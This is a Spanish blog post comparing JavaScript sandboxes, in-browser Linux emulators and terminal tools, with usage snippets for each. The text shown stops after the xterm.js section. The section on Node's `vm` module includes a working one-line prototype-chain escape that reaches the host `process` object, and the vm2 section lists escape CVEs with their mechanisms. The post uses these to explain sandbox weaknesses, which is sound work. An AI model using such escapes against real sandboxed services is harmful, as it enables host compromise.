---
title: Comparando Soluciones JavaScript para Simulaciones de Kernels Linux
description: Un análisis profundo de recreaciones de entornos Linux en
  JavaScript/TypeScript.
date: 2026-05-28
tags:
  - javascript
  - linux
  - analysis
authors:
  - fox3000foxy
author_pubkey: "MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEQcreZmmVx1U8zFHwsD+JTDIUKtMP5RYijaEkOIqZVfXIKA/i3h0lslw+ZgUBlLXKW3OVA2tGM8svcJWTXDxS8A=="
author_sig: "VQuThnpKbn9reeJr0nIMk/7zFSEIs50JL6CuAoYNJrXDdxgcuV55p9ERwA7MLwvKKJdD4NO1MQ4SAfj9BnBBzw=="
---

# Todos los sandboxes, emuladores, simuladores y honeypots de JavaScript -- comparados

He estado demasiado metido en este agujero de conejo por un tiempo. Empezó porque estaba ayudando con [typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container) -- un proyecto de Fortune (más sobre ella en un momento) -- y me seguían preguntando «espera, ¿en qué se diferencia esto de `v86`?» o «¿por qué no usar `vm2`?» -- y me di cuenta de que no podía dar una respuesta clara sin mapear todo el ecosistema primero. Así que aquí estamos supongo lol.

Resulta que hay cuatro familias distintas -- sandboxes JS, emuladores de Linux, simuladores de Linux y honeypots -- y casi nunca se superponen, aunque se mencionan constantemente en la misma conversación. Alguien que construye un sistema de plugins usa `isolated-vm`. Alguien que hace una demo de una herramienta CLI usa `v86`. Alguien que hace inteligencia de amenazas SSH usa Cowrie. Están resolviendo problemas completamente diferentes bajo el mismo paraguas vago de «ejecutar código en una caja».

Pasé mucho tiempo leyendo código fuente, informes CVE, documentos de arquitectura y páginas npm para escribir esto. Esto va a ser laaaargo -- tómate un café, en serio. O dos.

> Aviso rápido: `typescript-virtual-container` aparece prominentemente en este artículo porque fue lo que provocó esta investigación. He tratado de ser justo con todo lo demás, pero ten ese contexto en mente.

---

## Parte 0 -- Primero, ¿qué problema estás resolviendo realmente?

Antes de profundizar, vale la pena ser preciso sobre para qué sirve cada familia, porque la terminología se vuelve imprecisa rápidamente y la gente las confunde constantemente (incluyéndome a mí, antes de sentarme y mapearlo realmente).

**Los sandboxes JS** aíslan código JavaScript del proceso Node.js anfitrión. El modelo de amenaza es: código JS no confiable que podría llamar a `process.exit()`, leer archivos o spawnear procesos hijos. La solución es un límite alrededor de la ejecución de V8. Estas herramientas no tienen concepto de un shell de Linux, un sistema de archivos con permisos o SSH.

**Los emuladores de Linux** ejecutan un kernel de Linux real y sin modificar dentro de un emulador de CPU (x86, RISC-V, OR1K) implementado en JavaScript o WebAssembly. Arrancas un SO real. Obtienes syscalls reales. Obtienes compatibilidad binaria con programas compilados para x86. La sobrecarga es enorme.

**Los simuladores de Linux** falsifican el *comportamiento* de un sistema Linux sin ejecutar un kernel real. Implementan un intérprete de shell, un sistema de archivos virtual y suficientes semánticas de Unix para engañar a programas y humanos. Sin kernel. Sin Wasm. Sin emulación de CPU. Sobrecarga mucho menor.

**Los honeypots** están construidos para atraer atacantes y registrar lo que hacen. No son principalmente entornos de ejecución -- son herramientas de observabilidad. La fidelidad al comportamiento real de Linux importa solo en la medida en que evita que el atacante detecte la trampa.

Con ese marco, aquí es donde aterriza cada proyecto en este artículo:

```
Sandbox JS:        vm, vm2, isolated-vm, quickjs-emscripten, Deno Workers, ShadowRealm
Emulador Linux:    v86, JSLinux/TinyEMU, jor1k, CheerpX, WebContainers, container2wasm
Simulador Linux:   typescript-virtual-container (único en este espacio)
Honeypot:          Cowrie, Kippo, Lyrebird, endlessh, sshesame, node-simple-ssh-honeypot
Stack terminal:    xterm.js + node-pty (no es un aislador, pero adyacente)
```

---

## Parte 1 -- Sandboxes de JavaScript

### 1.1 `vm` -- el integrado de Node.js (no es lo que piensas)

La respuesta más antigua para «ejecutar JS no confiable» en Node es el módulo integrado `vm`. Ha estado ahí desde v0.1, así que mucha gente lo usa primero -- y luego se quema.

```js
const vm = require("vm");
const sandbox = { answer: 0 };
vm.createContext(sandbox);
vm.runInContext("answer = 6 * 7", sandbox);
console.log(sandbox.answer); // 42
```

Lo que `vm` realmente hace: crea un nuevo contexto V8 (un conjunto nuevo de constructores integrados -- `Object`, `Array`, `Function`, etc.) y ejecuta código en él, con una referencia compartida a lo que pongas en `sandbox`. Tu motor V8 no cambia. Tu proceso no cambia. La memoria es compartida.

La razón por la que `vm` no proporciona seguridad: la cadena de prototipos de JavaScript es un DAG que conecta todo de vuelta a `Object.prototype`. Si pones cualquier objeto del ámbito anfitrión en el sandbox, el invitado puede trepar por su cadena de prototipos y alcanzar los constructores anfitriones. Desde `Function`, puedes llamar a `Function("return process")()` y recuperar el objeto `process` real. Juego terminado. Así, inmediatamente.

```js
// Esto se ejecuta perfectamente en vm -- obtienes el objeto process real
vm.runInNewContext(`({}).__proto__.constructor("return process")()`);
```

La documentación de Node.js dice: «El módulo vm no es un mecanismo de seguridad. No lo uses para ejecutar código no confiable». Esta advertencia ha estado allí desde sieeempre. La gente la ignora constantemente. He visto aplicaciones en producción usar `vm` como sandbox. Por favor, no hagas eso xD

**Veredicto**: un mecanismo de ámbito, no un sandbox. Úsalo cuando necesites ámbito de variables aislado (motores de plantillas, funcionalidades tipo `eval` donde controlas el código). Nunca para entrada no confiable.

**Memoria**: sobrecarga insignificante -- mismo heap V8 que el proceso anfitrión.  
**Seguridad**: ninguna contra un atacante motivado.

---

### 1.2 `vm2` -- el intento comunitario, y su muy larga muerte

`vm2` fue la respuesta de la comunidad al problema de escape de `vm`. La idea central: envolver cada objeto que cruza el límite del sandbox en un `Proxy` que intercepta el acceso a propiedades, bloquea el ascenso por prototipos y filtra referencias peligrosas. ¡Idea inteligente en teoría! No tanto en la práctica, como veremos.

```js
const { VM } = require("vm2");
const vm = new VM({ timeout: 1000, sandbox: {} });
vm.run("process.exit(1)"); // lanza VMError, process no accesible
```

Durante varios años esto funcionó razonablemente bien. Pero la superficie de ataque de `Proxy` en JavaScript es enorme. Cada nueva característica del lenguaje JS -- generadores, iteradores asíncronos, `Symbol.toPrimitive`, `Error.prepareStackTrace`, slots internos de `Promise` -- es un posible vector de bypass.

La línea de tiempo de CVE es... algo. Mira esto:

| Fecha | CVE | Mecanismo |
|------|-----|-----------|
| Oct 2022 | CVE-2022-36067 | Escape de contexto anfitrión por `Error.prepareStackTrace` |
| Abr 2023 | CVE-2023-29017 | Fuga de objetos anfitriones por pila de error asíncrono no manejado |
| Abr 2023 | CVE-2023-29199 | Bypass de sanitización de excepciones vía `handleException()` |
| Abr 2023 | CVE-2023-30547 | `Proxy.getPrototypeOf` → `Function` → RCE |
| May 2023 | CVE-2023-32314 | `Proxy` en `Error.name` → `Function` → RCE |
| Jul 2023 | CVE-2023-37466 | Función asíncrona + desbordamiento de pila + `Proxy.getPrototypeOf` |
| Jul 2023 | CVE-2023-37903 | Worker thread + eval escape |

Tres CVEs críticos en el mismo mes (abril de 2023). TRES. EN UN SOLO MES. Después de CVE-2023-37903, el mantenedor deprecó oficialmente la librería con el mensaje: *«La librería contiene problemas de seguridad críticos y no debe usarse en producción».*

El mantenedor la resucitó en octubre de 2025 con la versión 3.10.0, afirmando haber arreglado todo lo conocido hasta ese momento. Un nuevo escape crítico (CVE-2026-22709, CVSS 9.8) se reveló en enero de 2026, seguido de un lote de once más en mayo de 2026. Once. El patrón no ha cambiado y honestamente no creo que cambie nunca.

El problema fundamental es arquitectónico -- y esta es la lección que le tomó un tiempo aprender a todo el ecosistema. No puedes construir un sandbox seguro usando el mismo lenguaje que estás aislando, en el mismo motor, en el mismo proceso. La superficie de escape es toda la implementación de V8 -- y V8 tiene varios millones de líneas de C++ que siguen cambiando. Cada nueva característica de JS potencialmente abre un nuevo camino de ataque.

**Veredicto**: No lo uses para aplicaciones sensibles a la seguridad. Incluso en la última versión, se descubren nuevos bypasses cada pocos meses. El propio mantenedor lo ha reconocido abiertamente.

---

### 1.3 `isolated-vm` -- el que realmente funciona

`isolated-vm` toma el enfoque correcto: usar la primitiva de aislamiento propia de V8, el Isolate. Cada V8 Isolate tiene su propio heap, su propio recolector de basura, su propio conjunto de built-ins y cero referencias compartidas con otros Isolates.

Este es el mismo límite que Chrome usa entre pestañas. Es un límite de seguridad real, no un truco a nivel de lenguaje construido sobre Proxy.

```js
import ivm from "isolated-vm";

// Cada isolate es su propio heap V8
const isolate = new ivm.Isolate({ memoryLimit: 64 }); // límite en MB
const context = await isolate.createContext();
const jail = context.global;

// Pasar datos a través del límite requiere serialización explícita
await jail.set("sensitiveData", "not this");
await jail.set("log", new ivm.Reference(console.log));

const script = await isolate.compileScript(`
  // No puede alcanzar el proceso anfitrión, el heap anfitrión ni los módulos anfitriones
  log.applySync(undefined, ["hello from the isolate"]);
`);
await script.run(context);

// Puedes terminar forzadamente por timeout o límite de memoria
isolate.dispose(); // libera todo el heap
```

Los tipos `Reference` y `ExternalCopy` son el puente de comunicación explícito. Un `Reference` le da al isolate un manejador invocable a una función anfitriona -- el isolate puede llamarla pero no puede inspeccionar su clausura o prototipo. Un `ExternalCopy` serializa un valor (clon estructurado) a través del límite del heap. Este modelo de puente explícito no es conveniente, pero es lo que hace real el aislamiento.

Puedes establecer límites de recursos duros: memoria (el isolate termina si excede el límite), timeout de tiempo real y timeout de CPU. La terminación es real -- mata todo el V8 Isolate, no solo un timeout de JS que se puede evitar con un `while(true)`.

**Limitaciones**: es solo JS. No puedes ejecutar bash dentro de él. No hay concepto de archivos, permisos, red o procesos. Es exactamente la herramienta adecuada para JS enviado por usuarios (plugins, fórmulas, hooks de scripts), y la herramienta equivocada para todo lo demás. La autora de `typescript-virtual-container` mencionó que lo consideró al principio antes de darse cuenta de que «ejecutar comandos de shell» y «aislar JavaScript» son problemas fundamentalmente diferentes.

**Memoria**: ~3–10 MB por isolate vacío, crece con el uso del heap.  
**Seguridad**: fuerte. El límite V8 Isolate es la primitiva de aislamiento real.  
**npm**: [isolated-vm](https://www.npmjs.com/package/isolated-vm)  
**GitHub**: [laverdet/isolated-vm](https://github.com/laverdet/isolated-vm)

---

### 1.4 `quickjs-emscripten` -- un motor JS separado compilado a Wasm

Un enfoque diferente: en lugar de aislar dentro de V8, ejecuta un motor JavaScript completamente separado compilado a WebAssembly. El anfitrión se ejecuta en V8/Node. El invitado se ejecuta en QuickJS-dentro-de-Wasm. El sandbox de Wasm proporciona el límite de aislamiento.

QuickJS es trabajo de Fabrice Bellard otra vez (el mismo de QEMU, FFmpeg, JSLinux, TinyEMU -- esta persona no es real, ¿cómo puede una persona hacer todo esto?). Es un motor JS pequeño y conforme al estándar ES2023 escrito en C, y cuando se compila a Wasm tiene solo ~500 KB.

```js
import { getQuickJS } from "quickjs-emscripten";

const QuickJS = await getQuickJS();
const vm = QuickJS.newContext();

const result = vm.evalCode(`
  // Se ejecuta en QuickJS, completamente separado de V8
  (function() { return 6 * 7; })()
`);

if (result.error) {
  console.log("Error:", vm.dump(result.error));
  result.error.dispose();
} else {
  console.log("Result:", vm.dump(result.value)); // 42
  result.value.dispose();
}

vm.dispose();
```

QuickJS es un motor JavaScript pequeño y conforme a ES2023 escrito en C. Compilado a Wasm, tiene ~500 KB para la variante síncrona, ~1 MB para la asíncrona (Asyncify). La gestión de memoria es manual -- cada valor que extraes de la VM debe ser explícitamente liberado, lo cual es un poco molesto pero evita sorpresas de GC entre límites. ¡Compensación divertida!

El wrapper `@sebastianwessel/quickjs` añade una API más ergonómica encima, con sistema de archivos virtual opcional, soporte fetch y stubs de módulos Node.js:

```ts
import variant from "@jitl/quickjs-ng-wasmfile-release-sync";
import { loadQuickJs } from "@sebastianwessel/quickjs";

const { runSandboxed } = await loadQuickJs(variant);

const result = await runSandboxed(
  async ({ evalCode }) => evalCode(`
    import { join } from 'path';
    export default join('src', 'dist');
  `),
  { allowFs: false, allowFetch: false }
);
```

El modelo de seguridad es diferente de `isolated-vm`: el modelo de memoria lineal de Wasm significa que el invitado no puede acceder directamente a los objetos del heap de V8. La superficie de ataque es la interfaz anfitrión↔Wasm (importaciones/exportaciones), no todo el lenguaje JS. Esto generalmente se considera más robusto que el sandboxing basado en Proxy.

La desventaja: QuickJS no tiene el mismo nivel de optimización que V8. Para cargas de trabajo JS intensivas en CPU, es 5–20x más lento que V8. Para fragmentos cortos y eval no confiable, esto normalmente no importa.

**Memoria**: ~500 KB módulo Wasm + heap por instancia.  
**Seguridad**: límite Wasm, considerado más fuerte que enfoques basados en Proxy.  
**npm**: [quickjs-emscripten](https://www.npmjs.com/package/quickjs-emscripten), [@sebastianwessel/quickjs](https://www.npmjs.com/package/@sebastianwessel/quickjs)  
**GitHub**: [justjake/quickjs-emscripten](https://github.com/justjake/quickjs-emscripten)

---

### 1.5 Deno -- runtime con permisos primero

Deno toma una filosofía completamente diferente: en lugar de hacer sandboxing dentro de Node, construye un nuevo runtime que es seguro por defecto. Este enfoque me gusta mucho -- es lo que Node.js debería haber sido desde el principio, honestamente. Ryan Dahl (el creador original de Node.js) literalmente hizo Deno porque se arrepentía de algunas decisiones de diseño de Node.js, lo cual es bastante loco cuando lo piensas.

Cada capacidad sensible (lectura de archivos, escritura, red, entorno, subprocesos) requiere una bandera explícita `--allow-*`:

```bash
# Esto solo puede leer de /data, nada más
deno run --allow-read=/data script.ts

# Esto solo puede hacer fetch a un dominio
deno run --allow-net=api.example.com script.ts

# Sin banderas = sin permisos
deno run untrusted.ts # no puede leer, escribir, hacer red, spawnear
```

El modelo de permisos está implementado a nivel de Rust/SO -- no es un truco de JS. Cuando el código de Deno llama a `Deno.readFile()`, esto pasa por una operación Rust que verifica la tabla de permisos antes de tocar el sistema de archivos. No puedes evitarlo desde JS porque la syscall nunca ocurre si el permiso no está concedido.

Para ejecutar código verdaderamente no confiable, Deno Workers (Web Workers) proporcionan un segundo isolate dentro del mismo proceso, cada uno con su propio conjunto de permisos. Puedes spawnear un worker con cero permisos y comunicarte con él mediante `postMessage`.

Deno 2 (lanzado en octubre de 2024) añadió compatibilidad total con npm y shims de compatibilidad con Node.js, lo que mejoró significativamente su adopción para casos de uso del lado del servidor.

**El tradeoff**: el modelo de seguridad de Deno es excelente para código en el que podrías confiar parcialmente. Para código completamente no confiable que podría ser adversarial, el modelo de permisos no ayuda -- necesitas un límite Isolate (`isolated-vm`) o un motor diferente (`quickjs-emscripten`), porque Deno sigue ejecutando V8 y atacantes sofisticados pueden encontrar bugs a nivel de V8.

---

### 1.6 TC39 ShadowRealm -- la respuesta estándar (eventualmente)

El organismo de estándares de JavaScript (TC39) tiene una propuesta llamada ShadowRealm que intenta estandarizar lo que `vm` y `vm2` estaban intentando hacer, pero con un modelo de seguridad correcto. Un ShadowRealm crea un contexto de ejecución JS aislado con su propio conjunto de intrínsecos, sin acceso al ámbito exterior, y una interfaz de importación/exportación cuidadosamente controlada.

```js
const realm = new ShadowRealm();
const result = realm.evaluate(`
  // Intrínsecos separados, sin acceso al ámbito exterior
  typeof globalThis.fetch // "undefined"
  6 * 7 // 42
`);
```

ShadowRealm está en navegadores (Chrome 90+, Firefox 105+) pero a partir de 2026 aún no está en Node.js estable. La propuesta de TC39 Compartments se basa en esto para aislamiento a nivel de módulos. Estas son las respuestas estandarizadas a largo plazo, pero aún no están listas para producción en Node del lado del servidor. Es una de esas cosas que ves venir desde lejos pero simplemente... aún no está ahí. TC39 clásico xD

---

### Resumen de la familia de sandboxes

| | `vm` | `vm2` | `isolated-vm` | `quickjs-emscripten` | Deno Workers |
|---|---|---|---|---|---|
| **Límite de aislamiento** | ninguno (solo ámbito) | Proxy (roto) | V8 Isolate | Wasm | V8 Isolate + permisos Rust |
| **Límite de memoria** | ❌ | ❌ | ✅ límite duro | ✅ heap Wasm | parcial |
| **Timeout de CPU** | ❌ | ✅ (burlable) | ✅ duro | ✅ | ✅ |
| **Seguridad** | ninguna | rota | fuerte | fuerte | fuerte |
| **Velocidad JS** | V8 nativo | V8 nativo | V8 nativo | ~10x más lento | V8 nativo |
| **Navegador** | ❌ | ❌ | ❌ | ✅ | ❌ |
| **Compatibilidad Node** | nativa | ✅ | ✅ | shims parciales | parcial |
| **Estado** | estable | riesgoso (nuevos CVEs) | ✅ activo | ✅ activo | ✅ activo |
| **Sobrecarga RAM** | ~1 MB | ~5–20 MB | ~3–10 MB | ~5–15 MB | ~10–30 MB |

La conclusión: si te importa la seguridad, hay exactamente dos opciones reales -- `isolated-vm` (addon nativo, V8 Isolate, velocidad JS completa) y `quickjs-emscripten` (Wasm, compatible con navegadores, ~10x más lento para código pesado). Todo lo demás es o «por favor no» (`vm`, `vm2`) o un runtime que resuelve un problema completamente diferente (Deno). ShadowRealm podría cambiar este panorama eventualmente, pero aún no está ahí.

---

## Parte 2 -- Emuladores de Linux en JavaScript

Aquí es donde las cosas se ponen realmente interesantes para mí. Estos son *emuladores reales* -- implementan un conjunto de instrucciones de CPU en JavaScript o WebAssembly, arrancan una imagen real de kernel de Linux y ejecutan binarios reales del espacio de usuario. El aislamiento viene del hecho de que el invitado y el anfitrión no comparten nada: diferentes espacios de memoria, diferentes flujos de instrucciones.

El precio que pagas es enorme, pero lo que obtienes es genuinamente notable: Linux real, realmente ejecutándose, en tu navegador o proceso Node. O sea, es bastante increíble cuando lo piensas, ¿no?

### 2.1 `v86` -- emulador de PC x86 en JS + JIT Wasm

`v86` de Fabrice (copy en GitHub) es el emulador x86 de código abierto más capaz en JavaScript. Comenzó como un intérprete JS puro alrededor de 2013 y ha evolucionado a un sistema JIT donde los bloques básicos x86 se traducen a WebAssembly sobre la marcha, mejorando drásticamente el rendimiento.

Lo que emula:
- **CPU**: x86-32 (IA-32), conjunto de instrucciones aproximadamente a nivel Pentium 1. Sin soporte de 64 bits (x86-64) -- esto es un límite arquitectónico duro, no una característica faltante.
- **FPU**: mediante `Float64Array` de JavaScript. x87 es de precisión extendida de 80 bits; los doubles JS son de 64 bits. Esto significa que los resultados de coma flotante pueden diferir ligeramente de una CPU real.
- **Memoria**: configurable, se asigna a un `SharedArrayBuffer` o `ArrayBuffer` en el heap JS.
- **Hardware**: 8254 PIT (temporizador), 8259 PIC (controlador de interrupciones), controlador de teclado 8042 (PS/2), CMOS RTC, VGA con extensiones SVGA y Bochs VBE, controlador IDE, controlador de disquete (8272A), tarjeta de red NE2000.
- **BIOS**: usa SeaBIOS (BIOS x86 de código abierto).

El JIT funciona identificando bloques básicos (secuencias de instrucciones x86 sin saltos), traduciéndolos a una función WebAssembly, almacenando en caché esa función y llamándola en ejecuciones posteriores del mismo bloque. Las rutas de código caliente obtienen rendimiento Wasm nativo. Las rutas frías recurren al intérprete JS.

```js
import { V86 } from "v86";
import { readFileSync } from "fs";

const emulator = new V86({
  bios:    { buffer: readFileSync("./bios/seabios.bin") },
  vga_bios:{ buffer: readFileSync("./bios/vgabios.bin") },
  hda:     { buffer: readFileSync("./images/alpine.img"), async: false },
  memory_size: 128 * 1024 * 1024, // 128 MB
  autostart: true,
});

// Capturar salida serial (consola del kernel Linux)
emulator.add_listener("serial0-output-byte", byte => {
  process.stdout.write(String.fromCharCode(byte));
});

// Enviar entrada al invitado (escribir en el shell)
emulator.serial0_send("ls /\n");
```

**SO soportado**: Alpine Linux (excelente), Ubuntu 16.04/18.04 (solo i386), Arch Linux 32, ReactOS, FreeDOS, Windows 9x/2000 (con limitaciones), MS-DOS.

**Tiempo de arranque**: 15–40 segundos para Alpine Linux desde una imagen limpia. Esto es inherente a la inicialización real del kernel -- no puedes saltártelo. Sí, tus usuarios estarán sentados viendo una secuencia de arranque del kernel en su navegador. Ese es el trato xD

**Memoria mínima**: 100–256 MB por instancia. El caché de código JIT Wasm solo puede alcanzar decenas de MB para una instancia ocupada de Linux.

**Uso en Node.js**: totalmente soportado. No necesita DOM -- la salida VGA puede descartarse si solo te importa la salida serie.

**Lo que no puedes hacer**: ejecutar binarios de 64 bits, usar características modernas del kernel (eBPF, io_uring, etc.), o ejecutar más de un puñado de instancias concurrentemente sin alcanzar límites de memoria.

**npm**: [v86](https://www.npmjs.com/package/v86) -- actualizado continuamente, la última publicación fue dentro del último día al momento de escribir.  
**GitHub**: [copy/v86](https://github.com/copy/v86)  
**Demo**: [copy.sh/v86](https://copy.sh/v86)

---

### 2.2 JSLinux y TinyEMU -- el trabajo de Bellard, dos veces

JSLinux es el propio emulador de Linux en JavaScript de Fabrice Bellard -- el primero de su tipo, publicado en 2011. Sigo mencionando a Bellard en este artículo porque sigue apareciendo: QuickJS, TinyEMU, JSLinux, QEMU, FFmpeg. El hombre es algo especial. Genuinamente una de las contribuciones técnicas individuales más impresionantes en la historia del software, sin exagerar.

El JSLinux original era un intérprete x86 en JS puro. En 2016, Bellard escribió TinyEMU (un emulador RISC-V en C), lo compiló a JavaScript mediante Emscripten, y eso se convirtió en la base del JSLinux actual. Así que el JSLinux actual es en realidad código C que genera JavaScript -- no JS escrito a mano en absoluto.

Las notas técnicas en el sitio de Bellard valen la pena leerlas: el JSLinux actual ejecuta una CPU RISC-V de 32 o 64 bits (no x86), emulando consola VirtIO, red VirtIO, dispositivo de bloque VirtIO y un sistema de archivos 9P para compartir archivos con el anfitrión. La demo JS está compilada desde C usando Emscripten -- no es JS escrito a mano.

TinyEMU en sí soporta:
- RISC-V RV32IMAFDQC y RV64IMAFDQC (32 y 64 bits, con coma flotante, multiplicación, instrucciones comprimidas)
- x86 mediante KVM (solo nativo, sin emulación -- así que la versión JS es solo RISC-V)
- Consola VirtIO, red, bloque, entrada, sistema de archivos 9P

TinyEMU tiene una demo JavaScript proporcionada mediante Emscripten. Es la base de JSLinux y también la usa `container2wasm` (ver sección 2.5).

**Estado de JSLinux**: no tiene paquete npm, no tiene API programática. Es una demo que abres en tu navegador. Su significado histórico es alto -- probó el concepto. Uso práctico como librería: ninguno.

**TinyEMU**: no está en npm, código fuente C disponible en [bellard.org/tinyemu](https://bellard.org/tinyemu/).

---

### 2.3 jor1k -- emulador OR1K

jor1k es un emulador OpenRISC 1000 (OR1K) escrito en JavaScript por Sebastian Macke. Es interesante históricamente porque jor1k introdujo soporte de sistema de archivos VirtIO 9P, que Bellard luego incorporó en TinyEMU y JSLinux. La polinización cruzada entre estos proyectos es estrecha -- todos se toman prestados unos de otros, que es honestamente una de las cosas más geniales del trabajo de emulación de código abierto.

**Estado**: ya no tiene mantenimiento activo, no tiene paquete npm. Archivado a estas alturas. Vale la pena conocerlo principalmente por contexto histórico -- como si alguien menciona jor1k en una conversación, ahora sabes lo que es :)

---

### 2.4 CheerpX -- emulador x86 comercial para el navegador

CheerpX de Leaning Technologies es el emulador x86 Linux comercial de grado de producción. No es de código abierto, pero es significativamente más capaz que v86 para ejecutar espacio de usuario real de Debian/Ubuntu. Si necesitas VSCode real en el navegador, esto es lo que usas.

Diferencias clave con v86:
- Soporta un ISA más amplio (más extensiones x86, mejor compatibilidad con glibc)
- Sistema de archivos respaldado por IndexedDB en el navegador (persistente entre cargas de página)
- Soporte pthread mediante `SharedArrayBuffer` (que requiere cabeceras COOP/COEP -- sí, esas molestas cabeceras de seguridad)
- Diseñado para ejecutar VSCode, Python, Node.js y otras aplicaciones reales -- no solo imágenes mínimas de SO
- Soporte profesional y SLA disponible (es decir, puedes gritarle a alguien si se rompe)

El caso de uso típico es «ejecutar una aplicación Linux real en el navegador sin un servidor». Las empresas lo usan para IDEs basados en navegador, tutoriales de programación y documentación interactiva.

```js
// API de CheerpX (simplificada)
const cx = await CheerpX.Linux.create({
  mounts: [{ type: "ext2", path: "/", dev: CloudDevice.create(...) }],
});
await cx.run("/bin/bash");
```

**Historia en Node.js**: CheerpX es primero para navegador. El emulador subyacente podría funcionar teóricamente en Node (es Wasm), pero la API y la documentación están orientadas enteramente al uso en navegador. El uso del lado del servidor no está soportado.

**Memoria**: similar a v86 -- 200+ MB para una instancia real de Debian.  
**Precios**: gratuito para proyectos de código abierto, licencia comercial para SaaS de producción.  
**Docs**: [cheerpx.io/docs/overview](https://cheerpx.io/docs/overview)

---

### 2.5 WebContainers (StackBlitz) -- Node.js en Wasm, no emulación de Linux

WebContainers a menudo se agrupa con emuladores de Linux pero es arquitectónicamente diferente. No emulan x86. No arrancan Linux. Ejecutan Node.js compilado a WebAssembly usando WASI. Esta distinción importa mucho y pasé demasiado tiempo confundido al respecto lol.

Creo que la confusión viene del marketing -- «ejecuta Node.js en tu navegador» suena a emulación, pero en realidad es Node.js compilado a Wasm, no emulación de Linux ejecutando Node.js dentro de una VM. Algo totalmente diferente.

La arquitectura:
1. Node.js se compila a Wasm (específicamente un runtime WASI personalizado)
2. Un Service Worker intercepta las solicitudes de red del servidor Node.js emulado y las enruta a la pestaña del navegador
3. El sistema de archivos vive en la memoria del navegador (sin E/S de disco)
4. npm es una implementación personalizada optimizada para uso en navegador

```js
import { WebContainer } from "@webcontainer/api";

const webcontainer = await WebContainer.boot();

// Escribir archivos
await webcontainer.mount({
  "index.js": { file: { contents: `console.log("hello")` } },
  "package.json": { file: { contents: `{"name":"demo","type":"module"}` } }
});

// Ejecutar comandos Node.js
const proc = await webcontainer.spawn("node", ["index.js"]);
proc.output.pipeTo(new WritableStream({ write: chunk => console.log(chunk) }));
```

Como ejecuta Node.js real (compilado a Wasm), obtienes npm real, APIs reales de Node.js y resolución de módulos real. No obtienes un espacio de usuario Linux de propósito general -- no puedes instalar paquetes del sistema con `apt`, ejecutar binarios compilados arbitrarios, o hacer mucho fuera del ecosistema Node.js.

**Requisitos del navegador**: SharedArrayBuffer (requiere cabeceras COOP/COEP), soporte de Service Worker, Wasm moderno.

**Historia en Node.js**: diseñado exclusivamente para uso en navegador. La API no funciona fuera de un contexto de navegador.

**npm**: [@webcontainer/api](https://www.npmjs.com/package/@webcontainer/api)  
**Docs**: [webcontainers.io](https://webcontainers.io)

---

### 2.6 container2wasm -- Contenedores Docker compilados a Wasm

`container2wasm` es una herramienta (no un paquete npm) de NTT que toma una imagen de contenedor Docker y la convierte en un binario WebAssembly que puede ejecutarse en cualquier host Wasm -- incluyendo un navegador. Cuando vi esto por primera vez, genuinamente no creía que funcionara.

El mecanismo:
- Para contenedores x86_64: incrusta Bochs (un emulador x86, compilado a Wasm) + el sistema de archivos raíz del contenedor
- Para contenedores riscv64: incrusta TinyEMU (¡Bellard otra vez!) + el sistema de archivos raíz del contenedor
- El archivo `.wasm` resultante arranca el emulador, monta el sistema de archivos del contenedor y ejecuta el entrypoint del contenedor

```bash
# Convertir contenedor Ubuntu 22.04 a Wasm
c2w ubuntu:22.04 out.wasm

# Ejecutarlo
wasmtime out.wasm uname -a
# Linux 5.15.0 #1 SMP riscv64 GNU/Linux

# O servirlo para uso en navegador
c2w --to-js ubuntu:22.04 /tmp/htdocs/
```

El `.wasm` resultante es grande -- un Ubuntu mínimo son varios cientos de MB -- pero es completamente autocontenido. Puedes enviar por correo un `.wasm` y alguien puede ejecutar Ubuntu en su navegador. Esa frase no debería tener sentido pero aquí estamos.

**GitHub**: [container2wasm/container2wasm](https://github.com/container2wasm/container2wasm)

---

### Resumen de la familia de emuladores

| | `v86` | JSLinux/TinyEMU | jor1k | CheerpX | WebContainers | container2wasm |
|---|---|---|---|---|---|---|
| **Arquitectura** | x86-32 JIT→Wasm | RISC-V (Wasm) | OR1K (JS) | x86 (propietario) | Node.js→Wasm/WASI | x86/RISC-V (Wasm) |
| **Kernel real** | ✅ | ✅ | ✅ | ✅ | ❌ (Node.js) | ✅ |
| **64 bits** | ❌ | ✅ (RISC-V) | ❌ | ✅ | n/a | ✅ |
| **Paquete npm** | ✅ | ❌ | ❌ | CDN/API | ✅ | ❌ (CLI) |
| **Uso Node.js** | ✅ | ❌ | ❌ | ❌ | ❌ (solo navegador) | vía Wasmtime |
| **Uso navegador** | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
| **RAM/instancia** | 150–256 MB | ~64–128 MB | ~64 MB | 200+ MB | ~100 MB | ~200–500 MB |
| **Tiempo arranque** | 15–40s | 10–30s | 10–30s | 15–40s | 2–5s | 10–40s |
| **Código abierto** | ✅ | ✅ | ✅ | ❌ | parcial | ✅ |
| **Estado** | ✅ muy activo | ✅ estable | ⚠️ archivado | ✅ comercial | ✅ activo | ✅ activo |

Lo que salta a la vista de esta tabla: `v86` es el único que es un paquete npm, funciona tanto en navegador como en Node, y es de código abierto. Por eso domina la conversación sobre «emulador de Linux en JavaScript». Todo lo demás tiene algún inconveniente -- JSLinux no tiene API, jor1k está archivado, CheerpX cuesta dinero, WebContainers es solo navegador y específico de Node, container2wasm requiere un paso de build y un CLI. Si solo necesitas «arrancar Linux en JavaScript», `v86` es casi siempre el punto de partida correcto.

---

## Parte 3 -- Stacks de terminal: xterm.js y node-pty

Dos paquetes aparecen constantemente cuando la gente construye experiencias tipo shell. No son sandboxes ni emuladores -- son la UI y la fontanería PTY -- pero son tan adyacentes que me sentiría mal dejándolos fuera. Además, he usado ambos y son realmente buenos.

### 3.1 `xterm.js` -- el renderizador de terminal

xterm.js es un emulador de terminal para el navegador. Renderiza una pantalla de terminal (secuencias de escape VT100/xterm) en un elemento `<canvas>`, maneja la entrada del teclado y expone una API para canalizar datos hacia adentro y hacia afuera.

Usado por: la terminal integrada de VS Code, Azure Cloud Shell, Proxmox VE, AWS CloudShell y muchos otros.

```js
import { Terminal } from "@xterm/xterm";
import { FitAddon } from "@xterm/addon-fit";

const term = new Terminal({ cursorBlink: true });
const fitAddon = new FitAddon();
term.loadAddon(fitAddon);
term.open(document.getElementById("terminal"));
fitAddon.fit();

// Enviar datos a la terminal (renderizados como texto)
term.write("$ ");
term.onData(data => {
  // data son pulsaciones de teclas -- enviar a tu backend
  socket.send(data);
});
socket.onmessage(msg => {
  // salida del backend -- mostrarla
  term.write(msg.data);
});
```

